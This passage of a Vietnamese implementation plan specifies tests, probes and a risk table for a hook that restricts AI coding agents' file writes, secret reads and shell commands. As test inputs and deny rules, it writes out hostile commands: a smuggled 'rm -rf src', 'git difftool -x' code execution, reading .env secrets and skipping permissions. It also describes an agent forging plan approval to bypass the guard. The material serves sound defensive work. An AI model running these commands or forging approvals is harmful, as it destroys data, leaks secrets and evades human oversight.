| **TC-03** | `hasApprovedPlanFooter` & `evaluatePlanApprovalContent`                                                                                                                                                  | Markdown plan có `- **Status**: Approved` nhưng dòng cuối là `"Do đó chưa cấp [PLAN_APPROVED]"` hoặc `"Kết luận: [PLAN_APPROVED]"` hoặc ``"`[PLAN_APPROVED]`"``.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    | `false`                                                                                                                                                                                                                                                                                                                                                                                                                                                             | **Boundary**: Dòng văn bản cuối cùng sau khi `.trim()` phải khớp chính xác `=== "[PLAN_APPROVED]"`, không chấp nhận `.endsWith("[PLAN_APPROVED]")`.                                                                                                                                                                                                                                                                                |
| **TC-04** | `isSelfForgedPlanWrite(newContent)`, Gate 3 `.md`-Only Guard trên toàn bộ `docs/**` (`BLK-03`, `BLK-04`) & Single-Step Pre-Approved Plan Guard                                                           | (a) `decide({ toolName: "write_to_file" \| "write_file" \| "Write", targetFile: "docs/plans/2026-10-19-x.md", newContent }, { planApproved: false })` với `newContent` có `- **Status**: Approved` ở Header HOẶC `[PLAN_APPROVED]` ở dòng cuối; (b) `decide({ toolName: "Write", targetFile: "docs/plans/x.test.mjs", newContent: "..." }, { planApproved: false })` (`BLK-03`); (c) `decide({ toolName: "Write" \| "write_to_file", targetFile: "docs/notes/x.test.mjs", newContent: "..." }, { planApproved: false })` (`BLK-04`).                                                                                                                                                                                                                                                                                                                                                                                                                                                | (a) `decide()` trả về `{ decision: "ask", reason: "⚠️ Plan Self-Forgery Guard..." }`; (b) và (c) trả về `{ decision: "ask", reason: "⚠️ Code Freeze Guard: only .md files are allowed inside unfrozen documentation paths..." }`.                                                                                                                                                                                                                                   | **Boundary (`BLK-03`, `BLK-04`)**: Nếu `targetFile` trong `docs/plans/` có đuôi `.md`, `Status: Ready for Review` và chuỗi `[PLAN_APPROVED]` chỉ xuất hiện ở giữa thân bài, `decide()` trả về `{ decision: "allow" }`; mọi file không có đuôi `.md` trong **toàn bộ `UNFROZEN_PREFIXES` (`docs/**`) và `UNFROZEN_FILES`** (`docs/plans/x.test.mjs`, `docs/notes/x.test.mjs`, `_.js`, `_.ts`) đều bị chặn.                          |
| **TC-05** | Gate 3 `decide()`, `extractInput()`, `formatHookOutput()` (`BLK-03`, `BLK-04`, `MAJ-10`, `MAJ-12`) & `Read` `.env*` Guard (`MAJ-08`)                                                                     | (a) `decide({ toolName: "replace_file_content" \| "edit_file" \| "Edit", targetFile: "docs/plans/2026-10-19-x.md", newContent })` với `Status: Approved`; (b) `extractInput` với `tool_name: "Edit", tool_input: { file_path: "src/a.ts", old_string: "a", new_string: "b" }`; (c) `formatHookOutput({ decision: "ask", reason: "blocked" }, { hook_event_name: "PreToolUse", permission_mode: "dontAsk" })` (`MAJ-10`); (d) `decide({ toolName: "Read" \| "read_file" \| "view_file", targetFile: ".env.local" })` (`MAJ-08`); (e) `formatHookOutput({ decision: "allow" }, { hook_event_name: "PreToolUse", permission_mode: "dontAsk" })` (`BLK-04`, `MAJ-10`, `MAJ-12`).                                                                                                                                                                                                                                                                                                        | (a) `{ decision: "allow" }`; (b) trích xuất đúng `oldContent: "a", newContent: "b"`; (c) trả về `{ hookSpecificOutput: { hookEventName: "PreToolUse", permissionDecision: "deny", permissionDecisionReason: "blocked" } }` và `expect(out).not.toHaveProperty("decision")`; (d) trả về `{ decision: "ask", reason: "⚠️ Code Freeze Guard: reading .env* secret files is prohibited..." }`; (e) trả về `null` (để `main()` không ghi stdout và exit `0` — `MAJ-12`). | Khi `hook_event_name === "PreToolUse"`, `formatHookOutput` **không bao giờ chứa trường `decision` ở cấp gốc** (`MAJ-10`) và chỉ thắt chặt quyền: trả `null` khi `decide()` cho phép (để hook thoát mã `0` không có stdout, giữ `--allowedTools` + `--disallowedTools` + `dontAsk` làm trần quyền mà không gây exit `2` trong `-p` mode — `BLK-04`, `MAJ-12`) và trả `"deny"` khi `decide()` trả `"ask"` dưới `dontAsk` (`BLK-03`). |
| **TC-06** | `decide({ command })` cho `claude` CLI, `run-claude.ps1`, `git difftool` & `vitest`/`eslint` `--config`/`-c` (`BLK-03`, `MIN-07`, `B1`)                                                                  | Cho phép: `claude --version`, `claude -p ping`, `npx vitest run src/lib/features/chat/batch-c.test.ts` (`MIN-07`), `powershell -ExecutionPolicy Bypass -File .agents/scripts/run-claude.ps1 -Role reviewer -PlanFile docs/plans/task.md`, và `-ArtifactFile C:/Users/wyemh/.gemini/antigravity/brain/conv/implementation_plan.md`.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  | `{ decision: "allow" }` cho lệnh hợp lệ (bao gồm đường dẫn file chứa `-c`, `-u`, `-i` như `batch-c.test.ts` — `MIN-07`); `{ decision: "ask" }` cho mọi lệnh có cờ/đường dẫn vượt quyền.                                                                                                                                                                                                                                                                             | **Negative (`BLK-03`, `MIN-07`, `B1`)**: `git difftool -y -x "node e.js" HEAD~1`, `npx vitest run --config docs/plans/x.mjs`, `npx vitest run -c docs/plans/x.mjs`, `npx eslint --print-config a.ts -c x.mjs`, `claude --dangerously-skip-permissions`, và `run-claude.ps1 -ArtifactFile src/app/page.tsx` bắt buộc trả về `{ decision: "ask" }`.                                                                                  |
| **TC-07** | `decide({ command })` cho `verify-docs.mjs` (`Minor 7`)                                                                                                                                                  | `decide({ command: "node scripts/verify-docs.mjs" })`, `decide({ command: "node .\\scripts\\verify-docs.mjs --strict-shorthand --expected-headings=113" })`.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        | `{ decision: "allow" }`                                                                                                                                                                                                                                                                                                                                                                                                                                             | **Negative**: `decide({ command: "node scripts/verify-docs.mjs; rm -rf src" })` hoặc `decide({ command: "node scripts/other-script.mjs" })` bắt buộc trả về `{ decision: "ask" }`.                                                                                                                                                                                                                                                 |
| **TC-08** | Giới hạn dung lượng Governance, Ma Trận Bảo Toàn Quy Chuẩn & 4 Lớp Phòng Thủ `run-claude.ps1` (`M5`, `BLK-02`..`BLK-04`, `MAJ-04`, `MAJ-05`, `MAJ-07`, `MAJ-08`, `MAJ-10`, `MAJ-12`, `MIN-05`..`MIN-07`) | Đọc dung lượng ký tự của toàn bộ `.agents/rules/*.md` và `.agents/agents/*/agent.md`, kiểm tra 15 mục quy chuẩn trong Mục 6.4, và kiểm tra nội dung `.agents/scripts/run-claude.ps1` + `.agents/scripts/code-freeze-guard.js`.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      | Mọi file `rules/*.md <= 12,000 chars`; mọi file `agent.md <= 10,000 chars` (`reviewer/agent.md < 7,500 chars`); tổng `always_on` rules `< 18,000 chars`.                                                                                                                                                                                                                                                                                                            | Bảo toàn 100% 15 mục bắt buộc theo Mục 6.4; `code-freeze-guard.js` không còn chứa `.plan-approved` (`MAJ-07`), có `export function isPlanApproved()` dùng `REPO_ROOT` (`MAJ-09`), có `MUTATING_FLAGS` dùng `(?:^                                                                                                                                                                                                                   | \s)-(?:c | u   | i)(?:\s | =   | $)` (`MIN-07`), và `formatHookOutput` trả `null` khi `PreToolUse` + `allow` (`MAJ-12`); `run-claude.ps1` truyền `--settings $claudeHookSettings` có `"onFailure":"block"` (`MAJ-10`), dùng `Edit(docs/plans/*.md)`, có dấu cách trước `*` cho mọi rule tiền tố trong `$sharedAllowedBash`, có `Read(.env*),Read(\*\*/.env*)` (`MAJ-08`), có `Bash(powershell _),Bash(pwsh _),Bash(claude _)` (`MIN-06`), có `Bash(git difftool_),Bash(_ --config_),Bash(_ -c _)` (`BLK-03`), và dùng `IsPathRooted`+`$resolvedArtifactFile` (`MIN-05`). |
| **TC-09** | `node scripts/verify-docs.mjs --strict-shorthand --expected-headings=113`                                                                                                                                | Chạy kiểm định toàn bộ tài liệu trong repo.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         | Exit code `0`, hiển thị `>>> ALL DOCUMENTATION VERIFICATION CHECKS PASSED. <<<`.                                                                                                                                                                                                                                                                                                                                                                                    | Cả 5 cổng (`[1/5]` Path Existence, `[2/5]` Zero Legacy Refs bao gồm `.agents/workflows/`, `[3/5]` Strict Shorthand, `[4/5]` Character Limits, `[5/5]` `docs/CHANGELOG.md < 35,000 bytes` & `totalHeadings === 113`) đều phải PASS.                                                                                                                                                                                                 |

---

### 9. Kế Hoạch Kiểm Thử Co-Located & Verification Plan

#### 9.1. File Test Co-Located

- **File test**: `.agents/scripts/code-freeze-guard.test.ts` (đặt cạnh `.agents/scripts/code-freeze-guard.js`).
- **Số lượng test cases dự kiến**: Hiện có 92 tests; bổ sung tối thiểu **27 test cases mới** (tổng `>= 119 tests`) bao phủ đầy đủ `TC-01` đến `TC-08` (bao gồm `TC-02(g)`, `TC-04(c)`, `TC-05(c),(e)`, và `TC-06` `batch-c.test.ts` vs `-c`) và giữ nguyên test tích hợp `isPlanApproved()` tại dòng 595–598 (`MAJ-09`).

#### 9.2. Lệnh Kiểm Thử Tự Động (Verification Commands)

```powershell
npm run type-check
npm run lint
npx vitest run .agents/scripts/code-freeze-guard.test.ts
npm run test:run
node scripts/verify-docs.mjs --strict-shorthand --expected-headings=113
```

#### 9.3. Wiring Probes & Negative Probes

1. **Wiring Probe 1 (4-Layer Defense-in-Depth: `--settings` `PreToolUse` Hook với `"onFailure": "block"` & `allow` ➔ `null` / Empty Stdout, `.md`-Only Across `docs/**`, Spaced Wildcards & `IsPathRooted`—`BLK-02`..`BLK-04`, `MAJ-04`, `MAJ-05`, `MAJ-08`, `MAJ-10`, `MAJ-12`, `MIN-05`, `MIN-06`)\*\*:
   - Kiểm tra `.agents/hooks.json` có đúng `"matcher": "write_to_file|replace_file_content|multi_replace_file_content|write_file|edit_file|run_command"` và `"command": "node scripts/code-freeze-guard.js"`.
   - Kiểm tra `scripts/code-freeze-guard.js` re-export đúng module ESM từ `.agents/scripts/code-freeze-guard.js`.
   - Kiểm tra `.agents/scripts/run-claude.ps1`:
     - **Lớp 1 (`BLK-03`, `BLK-04`, `MAJ-10`, `MAJ-12`)**: Truyền `"--settings", $claudeHookSettings` vào `$cliArgs`, trong đó `$claudeHookSettings` gắn `node .agents/scripts/code-freeze-guard.js` với `"onFailure":"block"` cho `Write|Edit|MultiEdit|Bash|Read`. Đồng thời chạy thử `node .agents/scripts/code-freeze-guard.js` (trong test/probe) với payload mẫu của Claude CLI qua stdin:
       - Khi payload được phép (`{"hook_event_name":"PreToolUse","permission_mode":"dontAsk","tool_name":"Write","tool_input":{"file_path":"docs/plans/2026-10-23-test.md","content":"# Plan\n- **Status**: Ready for Review\n"}}`), tiến trình thoát mã `0` với **stdout rỗng (`""`)** (`formatHookOutput === null` — `MAJ-12`).
       - Khi payload bị chặn (`{"hook_event_name":"PreToolUse","permission_mode":"dontAsk","tool_name":"Write","tool_input":{"file_path":"docs/notes/x.test.mjs","content":"x"}}`), JSON xuất ra trên stdout khớp tuyệt đối schema `{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"deny","permissionDecisionReason":"..."}}` (tuyệt đối không có trường `"decision"` ở cấp gốc — `MAJ-10`).
     - **Lớp 2 (`BLK-03`, `BLK-04`, `MAJ-04`)**: Sử dụng `Edit(docs/plans/*.md)` (không còn `Edit(docs/plans/**)` hay `Write(<path>)`), truyền tool trần `Write` vào `--disallowedTools` của `reviewer`, và kiểm tra Gate 3 của `code-freeze-guard.js` chặn mọi file không có đuôi `.md` trên toàn bộ `UNFROZEN_PREFIXES` (`docs/**`) và `UNFROZEN_FILES`.
     - **Lớp 3 (`BLK-03`, `MAJ-05`)**: Trong `$sharedAllowedBash`, mọi rule tiền tố có tham số đều có dấu cách trước `*` (`Bash(git diff *)`, `Bash(git log *)`, `Bash(git show *)`, `Bash(git status *)`, `Bash(git blame *)`, `Bash(npm ls *)`, `Bash(node scripts/verify-docs.mjs *)`, `Bash(npm run test:run *)` — không còn `Bash(git diff*)`).
     - **Lớp 4 (`BLK-02`, `BLK-03`, `MAJ-08`, `MIN-06`)**: Trong `$sharedDisallowed`, có đủ `Read(.env*),Read(**/.env*)`, `Bash(powershell *),Bash(pwsh *),Bash(claude *)`, `Bash(git difftool*),Bash(* --config*),Bash(* -c *),Bash(* --root*),Bash(* --dir*),Bash(* --globalSetup*),Bash(* --setupFiles*),Bash(* --extcmd*)` và các mẫu chặn `--output`/`--fix`/`--write`/`-u`/`--coverage`.
     - **Kiểm tra `$ArtifactFile` (`MIN-05`)**: Gọi `[System.IO.Path]::IsPathRooted` (`exit 43`) và dùng `$resolvedArtifactFile` tại `Split-Path`, `New-Item`, `Copy-Item`.
2. **Wiring Probe 2 (Governance Size, Normative Preservation Matrix, Subdirectory Globs & Model Roster Audit — `M1`, `M2`, `M3`, `M5`)**:
   - Chạy kiểm tra kích thước các file `.agents/rules/*.md` và `.agents/agents/*/agent.md` đảm bảo:
     - `00-core.md + 02-quality.md + 05-plan-review.md < 18,000 chars` và bảo toàn đủ 15 mục quy chuẩn bắt buộc tại Mục 6.4.
     - `01-coding.md` có `globs: "*.ts, *.tsx, *.js, *.mjs, **/*.ts, **/*.tsx, **/*.js, **/*.mjs"` và `03-ui.md` có `globs: "*.tsx, *.css, **/*.tsx, **/*.css"`.
     - `reviewer/agent.md < 7,500 chars`.
     - YAML frontmatter của cả 3 file `planner/agent.md`, `reviewer/agent.md`, `qa/agent.md` đều có `model: pro` và không còn trường `role:`; `planner/agent.md:30` vẫn giữ yêu cầu đọc `.agents/rules/02-quality.md`.
     - Toàn bộ `.agents/` đã thay thế hoàn toàn `claude-4.6-opus` và `Gemini 3.1 Pro` bằng bộ 4 model chuẩn tháng 10/2026 (`gemini-4-argon`, `claude-opus-5-5`, `claude-sonnet-5-5`, `gemini-3.8-flash`).
3. **Wiring Probe 3 (Post-Step 5 Repo Re-Lock Across All 4 `2026-10-19` Plans, Untracked `2026-10-23` Plan Handling, `export function isPlanApproved()` & `REPO_ROOT` — `MAJ-06`, `MAJ-07`, `MAJ-09`, `MAJ-11`)**:
   - Kiểm tra `.agents/scripts/code-freeze-guard.js` không còn chứa chuỗi `.plan-approved` (`MAJ-07`) và xuất `export function isPlanApproved()` dùng `REPO_ROOT` (`MAJ-09`).
   - Sau khi hoàn tất Bước 5 và đóng cả 4 kế hoạch ngày `2026-10-19` sang `- **Status**: Completed`, kiểm tra cả 4 file `docs/plans/2026-10-19-*.md` trên đĩa đều có `- **Status**: Completed` ở Header và `isPlanApproved()` thực tế tất định trả về `false` (dù file untracked `docs/plans/2026-10-23-strata-local-llm-implementation-plan.md` có `Status: Ready for Review` còn nằm trong `docs/plans/` — nhóm `2026-10-23` trả về `false` qua fail-safe — hay được dọn đi — nhóm `2026-10-19` có cả 4 kế hoạch `Completed` và trả về `false` — `MAJ-06`, `MAJ-11`).
4. **Wiring Probe 4 (End-to-End CLI Smoke Probe cho `claude -p --settings` `PreToolUse` Hook — `MAJ-12`)**:
   - Sau khi hoàn tất cập nhật `.agents/scripts/run-claude.ps1` và `.agents/scripts/code-freeze-guard.js` ở Bước 5, User/Orchestrator chạy kiểm thử khói trực tiếp với `claude -p` (kèm `--debug` hoặc qua `.agents/scripts/run-claude.ps1`) để xác nhận thực nghiệm 3 điểm:
     1. Hook `PreToolUse` (`node .agents/scripts/code-freeze-guard.js`) truyền qua `--settings $claudeHookSettings` thực sự được nạp và kích hoạt trong chế độ `-p` non-interactive.
     2. Thao tác hợp lệ (`Read docs/plans/README.md`) được hook cho qua (exit `0`, không ghi stdout) và lệnh `claude -p` hoàn tất với mã thoát `0` (không bao giờ bị dừng bởi exit code `2`).
     3. Thao tác vi phạm (`Read .env.local` và `Write docs/notes/x.test.mjs`) bị chặn cứng bởi tổ hợp hook `permissionDecision: "deny"` và `--disallowedTools` / `dontAsk`.
5. **Negative Probe 1 (Stale Completed Plans, Multi-Plan Same-Day / Newer-Date Fail-Safe & Future Date Prefix Spoofing Rejection — `M4`, `MAJ-06`, `MAJ-11`, `MIN-04`)**:
   - Trong `.agents/scripts/code-freeze-guard.test.ts`, truyền: (a) plan có `- **Status**: Completed` + `[PLAN_APPROVED]` vào `evaluatePlanApprovalContent()` ➔ trả về `false`; (b) 2 plan cùng ngày `2026-10-19` (1 plan `Approved`, 1 plan `Ready for Review`) vào `evaluateLatestDateGroupPlans()` ➔ trả về `false`; (c) 1 plan cũ `2026-10-08` (`Approved`, `mtimeMs` mới hơn) và 1 plan mới `2026-10-19` (`Ready for Review`, `mtimeMs` cũ hơn) vào `evaluateLatestDateGroupPlans()` ➔ trả về `false`; (d) cả 4 plan ngày `2026-10-19` đều `Completed` ➔ trả về `false` (`MAJ-06`); (e) 1 plan giả mạo ngày tương lai `2099-01-01-spoof.md` (`Approved`) kèm các plan `2026-10-19` (`Completed`) với `maxDatePrefix: "2026-10-20"` ➔ trả về `false` (`MIN-04`); (f) 1 plan ngày `2026-10-19` (`Approved`, `mtimeMs` cao hơn) và 1 plan ngày `2026-10-23` (`Ready for Review`, `mtimeMs` thấp hơn) vào `evaluateLatestDateGroupPlans()` ➔ trả về `false` (`MAJ-11`).
6. **Negative Probe 2 (Trailing Prose Rejection)**:
   - Truyền một plan có `- **Status**: Approved` và dòng cuối `"Vì vậy chưa thể cấp [PLAN_APPROVED]"` vào `evaluatePlanApprovalContent()` ➔ xác nhận trả về `false`.
7. **Negative Probe 3 (Single-Step Pre-Approved Plan Block, Non-Markdown `docs/**`Block & Hook`null`-on-Allow Non-Escalation — `BLK-03`, `BLK-04`, `MAJ-10`, `MAJ-12`, `B1`, `B2`)\*\*:
   - Gọi `decide({ toolName: "write_to_file", targetFile: "docs/plans/2026-10-19-attack.md", newContent: "# Plan\n- **Status**: Approved\n" }, { planApproved: false })`, `decide({ toolName: "Write", targetFile: "docs/plans/x.test.mjs", newContent: "import fs from 'fs';" }, { planApproved: false })`, và `decide({ toolName: "Write", targetFile: "docs/notes/x.test.mjs", newContent: "import fs from 'fs';" }, { planApproved: false })` ➔ xác nhận cả ba đều trả về `{ decision: "ask" }`, và khi đi qua `formatHookOutput(result, { hook_event_name: "PreToolUse", permission_mode: "dontAsk" })` trả về `{ hookSpecificOutput: { hookEventName: "PreToolUse", permissionDecision: "deny", permissionDecisionReason: ... } }` (không có trường `decision` cấp gốc — `MAJ-10`); đồng thời khi `result` là `{ decision: "allow" }` thì `formatHookOutput` trả về `null` (không ghi stdout và không nới quyền vượt `--allowedTools` — `BLK-04`, `MAJ-12`).
8. **Negative Probe 4 (Arbitrary Code Execution via `git difftool -x`, `vitest`/`eslint` `--config`/`-c`, Path Hyphen Preservation & `.env*` Secret Read Prevention — `BLK-02`, `BLK-03`, `MAJ-08`, `MIN-07`, `B1`)**:
   - Trong `.agents/scripts/code-freeze-guard.test.ts`, gọi `decide()` với:
     - `command: 'git difftool -y -x "node exploit.js" HEAD~1'` ➔ `{ decision: "ask" }` (`BLK-03`).
     - `command: "npx vitest run --config docs/plans/x.mjs"` và `command: "npx vitest run -c docs/plans/x.mjs"` ➔ `{ decision: "ask" }` (`BLK-03`, `MIN-07`), trong khi `command: "npx vitest run src/lib/features/chat/batch-c.test.ts"` ➔ `{ decision: "allow" }` (`MIN-07`).
     - `command: "npx eslint --print-config src/a.ts -c docs/plans/x.mjs"` ➔ `{ decision: "ask" }` (`BLK-03`).
     - `toolName: "Read", targetFile: ".env.local"` và `toolName: "Read", targetFile: "C:/Users/wyemh/vikini/.env"` ➔ `{ decision: "ask" }` với `reason` chứa `"reading .env* secret files is prohibited"` (`MAJ-08`).

---

### 10. Rủi Ro Tiềm Ẩn & Phương Án Phòng Ngừa

|  #  | Rủi Ro Tiềm Ẩn                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |     Mức Độ     | Phương Án Phòng Ngừa & Technical Control Cụ Thể (`[SRC]` / Probe)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
| :-: | :----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | :------------: | :----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------- | --- | ------- | --- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
|  1  | **Thực thi code tùy ý, nới quyền qua hook `allow`, dừng tiến trình bởi `"defer"` (exit code 2) trong `-p` mode, JSON hook sai schema `PreToolUse`, chặn nhầm đường dẫn test chứa `-c`/`-u`/`-i`, hoặc rò rỉ `.env*` trên kênh Antigravity & Claude Code CLI** (`BLK-02`..`BLK-04`, `MAJ-04`, `MAJ-05`, `MAJ-08`, `MAJ-10`, `MAJ-12`, `MIN-05`..`MIN-07`, `B1`, `B2`).                                                                                                                                                                            |    **Cao**     | **Technical Control (4-Layer Defense-in-Depth)**: (1) **Lớp 1 (`PreToolUse` Hook với `"onFailure": "block"` & `allow` ➔ `null` / no stdout + exit `0`)**: Trong `.agents/scripts/run-claude.ps1` truyền `--settings $claudeHookSettings` gắn `node .agents/scripts/code-freeze-guard.js` kèm `"onFailure":"block"` (`MAJ-10`); trong `formatHookOutput(result, rawPayload)` khi `hook_event_name === "PreToolUse"`, nếu `result.decision === "allow"` thì trả về `null` để `main()` không ghi stdout và exit `0` (tránh cả lỗi vượt quyền `--allowedTools` của `"allow"` lẫn lỗi exit code `2` của `"defer"` trong `-p` mode — `BLK-04`, `MAJ-12`), còn nếu khác `"allow"` thì trả về `{ hookSpecificOutput }` không có trường `decision` cấp gốc và ánh xạ sang `"deny"` dưới `dontAsk` (`BLK-03`, `MAJ-10`). (2) **Lớp 2 (`.md`-Only Across All `docs/**`)**: Thu hẹp thành `Edit(docs/plans/_.md)`trong`run-claude.ps1`(với`reviewer`thêm`Write`trần vào`--disallowedTools`—`MAJ-04`) và chặn mọi file không có đuôi `.md`trên **toàn bộ`UNFROZEN_PREFIXES` (`docs/**`) và `UNFROZEN_FILES`** tại Gate 3 của `code-freeze-guard.js` (`!relative.toLowerCase().endsWith(".md")` — `BLK-03`, `BLK-04`). (3) **Lớp 3 (Spaced Bash Prefix Rules)**: Thêm dấu cách trước `_`cho mọi rule tiền tố trong`$sharedAllowedBash` (`Bash(git diff \*)`—`BLK-03`, `MAJ-05`). (4) **Lớp 4 (Whitespace-Bounded Flag, CLI & Secret Deny)**: Mở rộng `MUTATING_FLAGS`tại`code-freeze-guard.js:71`với ranh giới khoảng trắng`(?:^ | \s)-(?:c | u   | i)(?:\s | =   | $)` (`MIN-07`) và `$sharedDisallowed`tại`run-claude.ps1`để chặn`--config`, `-c`, `--root`, `--dir`, `--globalSetup`, `--setupFiles`, `--extcmd`, `git difftool*`, `powershell *`, `pwsh _`, `claude _` (`MIN-06`), `--output`, `--outputFile`, `--fix`, `--write`, `-u`, `--update`, `--coverage`, chặn đọc `.env*`bằng`Read(.env*),Read(\*_/.env_)` + Read Guard (`MAJ-08`), và bắt buộc `IsPathRooted($ArtifactFile)` + `$resolvedArtifactFile` (`MIN-05`). Kiểm chứng bằng `TC-04`..`TC-08`, `Wiring Probe 1, 4`và`Negative Probe 3, 4`. |
|  2  | **Single-Step Pre-Approved Plan Guard chặn nhầm kế hoạch hợp lệ** có nhắc tới chuỗi `` `[PLAN_APPROVED]` `` trong phần mô tả kỹ thuật, hoặc **rủi ro tồn dư (residual risk) khi tác nhân cố tình giả mạo qua 2 bước** (`write_file` với `Status: Ready for Review` rồi gọi `edit_file` đổi sang `Status: Approved` + `[PLAN_APPROVED]`) do payload stdin của hook `PreToolUse` không chứa danh tính subagent (`B2`, `MIN-04`).                                                                                                                   |    **Cao**     | **Technical Control & Compensating Controls**: (1) Trong `isSelfForgedPlanWrite(newContent)` tại `.agents/scripts/code-freeze-guard.js` (Mục 6.1), sử dụng `hasApprovedPlanHeader(newContent) \|\| hasApprovedPlanFooter(newContent)` (chỉ kiểm tra 30 dòng đầu có `- **Status**: Approved` hoặc dòng không rỗng cuối cùng `=== "[PLAN_APPROVED]"`), chặn triệt để việc tạo/ghi đè 1 bước qua `write_to_file`/`write_file`/`Write` mà không chặn nhầm kế hoạch hợp lệ và không làm đứt Uninterrupted Execution Chain khi `@reviewer` gọi `replace_file_content`/`edit_file`/`Edit`. (2) Đối với rủi ro tồn dư tự giả mạo 2 bước (do giới hạn kiến trúc của hook stdin không phân biệt được Orchestrator và `@reviewer`), hệ thống áp dụng 3 chốt kiểm soát bù trừ (compensating controls): (a) bắt buộc lưu vết đầy đủ `### Audit Run X` kèm bằng chứng `[CMD]`/`[SRC]` trong `## Audit History`, (b) kiểm tra dấu vết chỉnh sửa qua `git diff docs/plans/`, và (c) nghiệm thu độc lập bởi subagent `@qa` (`MIN-04`). Kiểm chứng bằng `TC-04`, `TC-05`.                                                                                                                                                                                                                                                                                                                                                                                                                                                            |
|  3  | **Chuyển `.agents/rules/01-coding.md` và `03-ui.md` sang `trigger: glob`** không khớp các file trong thư mục con (`src/lib/core/...`) hoặc làm `@planner`/`@reviewer` thiếu ngữ cảnh chuẩn code khi chỉ đọc file `.md` (`M3`).                                                                                                                                                                                                                                                                                                                   |    **Cao**     | **Technical Control**: (1) Khai báo tường minh cả mẫu cấp gốc và mẫu đệ quy `**/*` trong YAML frontmatter: `globs: "*.ts, *.tsx, *.js, *.mjs, **/*.ts, **/*.tsx, **/*.js, **/*.mjs"` tại `.agents/rules/01-coding.md:3` và `globs: "*.tsx, *.css, **/*.tsx, **/*.css"` tại `.agents/rules/03-ui.md:3`. (2) Bổ sung mục **Core Coding & Testing Invariants** (~1,000 ký tự) vào `.agents/rules/00-core.md` (`trigger: always_on`) và giữ yêu cầu đọc `.agents/rules/02-quality.md` tại `.agents/agents/planner/agent.md:30` (`M2`). Kiểm chứng bằng `Wiring Probe 2`.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               |
|  4  | **Thứ tự `mtimeMs` bị đảo lộn sau `git clone`/`checkout`, nhiều kế hoạch trong cùng một ngày (`2026-10-19` có 4 kế hoạch), sự tồn tại của file untracked ngày mới hơn (`2026-10-23-strata-local-llm-implementation-plan.md` có `Status: Ready for Review`) làm khóa sớm Gate 8 (`scripts/verify-docs.mjs`), nhánh legacy `.agents/.plan-approved` còn sót, sai chữ ký `export function isPlanApproved()` / hằng số `REPO_ROOT`, hoặc đặt tên file ngày tương lai (`2099-01-01-x.md`)** (`M4`, `MAJ-06`, `MAJ-07`, `MAJ-09`, `MAJ-11`, `MIN-04`). |    **Cao**     | **Technical Control**: (1) Đảo thứ tự thực thi để **Bước 4** (cập nhật `scripts/verify-docs.mjs` tại Gate 8) chạy **TRƯỚC Bước 5** (cập nhật `isPlanApproved()` trong `code-freeze-guard.js`), nhờ đó `scripts/verify-docs.mjs` được chỉnh sửa khi `isPlanApproved()` theo `mtimeMs` đang trả về `true` cho bản kế hoạch `2026-10-19-remake-agents-governance-v2-implementation-plan.md` vừa được duyệt (`MAJ-11`). (2) Xóa bỏ hoàn toàn nhánh kiểm tra `.agents/.plan-approved` khỏi `export function isPlanApproved()` (giữ nguyên từ khóa `export` và dùng `path.join(REPO_ROOT, "docs", "plans")` tại `.agents/scripts/code-freeze-guard.js:33,176` — `MAJ-07`, `MAJ-09`). (3) Trong `evaluateLatestDateGroupPlans(planEntries, options)` (Mục 6.1): lọc bỏ mọi file có `datePrefix > maxDatePrefix` (mặc định `UTC today + 1 day` — `MIN-04`), sắp xếp giảm dần theo `YYYY-MM-DD` trước rồi mới xét `mtimeMs`, và khóa fail-safe (`return false`) nếu bất kỳ kế hoạch nào trong nhóm ngày mới nhất chưa `Completed` và chưa `Approved`. (4) Ở cuối Bước 5, đóng trạng thái `- **Status**: Completed` cho đầy đủ cả **4** kế hoạch ngày `2026-10-19` (`MAJ-06`, `MAJ-11`) để `isPlanApproved()` tất định trả về `false` dù `2026-10-23-strata-local-llm-implementation-plan.md` còn nằm trong `docs/plans/` hay được dọn đi. Kiểm chứng bằng `TC-02`, `Wiring Probe 3` và `Negative Probe 1`.                                                                                                                  |
|  5  | **Thu gọn `.agents/rules/02-quality.md` và `.agents/rules/05-plan-review.md`** làm rơi mất các quy chuẩn bắt buộc, hoặc **xóa `.agents/workflows/`** gây broken links / lệch số lượng heading `## ` trong `scripts/verify-docs.mjs` (`M5`, `Minor 4`).                                                                                                                                                                                                                                                                                           | **Trung bình** | **Technical Control**: (1) Tuân thủ nghiêm ngặt **Ma Trận Bảo Toàn Quy Chuẩn** gồm 15 mục tại Mục 6.4 (`TC-08`). (2) Cập nhật đủ 5 vị trí `.agents/workflows/` tại `.agents/rules/02-quality.md:19,30,41,99,140`, `.agents/agents/planner/agent.md:57`, `.agents/scripts/claude-planner-prompt.md:64`, `docs/lessons-learned.md:5`, và thêm regex `/\.agents\/workflows\//` vào cổng `[2/5]` của `scripts/verify-docs.mjs`. (3) Chạy `node scripts/verify-docs.mjs --strict-shorthand --expected-headings=113` đạt PASS 5/5 (`TC-09`).                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                